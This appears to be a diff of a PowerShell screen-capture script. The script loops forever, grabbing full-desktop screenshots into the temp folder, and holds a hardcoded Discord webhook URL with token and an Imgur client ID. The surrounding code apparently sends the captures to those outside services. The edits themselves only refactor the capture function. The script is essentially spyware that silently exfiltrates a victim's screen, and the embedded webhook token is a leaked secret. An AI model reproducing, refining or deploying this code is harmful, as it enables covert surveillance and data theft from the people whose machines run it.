@@ -5,18 +5,18 @@ function Capture-Screenshot {
 
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-    $screens = [Windows.Forms.Screen]::AllScreens
+    $screens = [System.Windows.Forms.Screen]::AllScreens
 
-    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+    $top    = ($screens | ForEach-Object { $_.Bounds.Top }    | Measure-Object -Minimum).Minimum
+    $left   = ($screens | ForEach-Object { $_.Bounds.Left }   | Measure-Object -Minimum).Minimum
+    $width  = ($screens | ForEach-Object { $_.Bounds.Right }  | Measure-Object -Maximum).Maximum
+    $height = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum
 
-    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $bounds   = [System.Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.Width), ([int]$bounds.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
 
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
 
     $bmp.Save($OutputFilePath)
     $graphics.Dispose()
@@ -83,7 +83,7 @@ function Send-DiscordMessage {
 $discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
 $imgurClientId = "ffd17df3bb7faec"
 
-while($true) {
+while ($true) {
     $outputFilePath = "$env:temp\$env:computername-Capture.png"
     Capture-Screenshot -OutputFilePath $outputFilePath
     Write-Host "Screenshot captured and saved at: $outputFilePath"
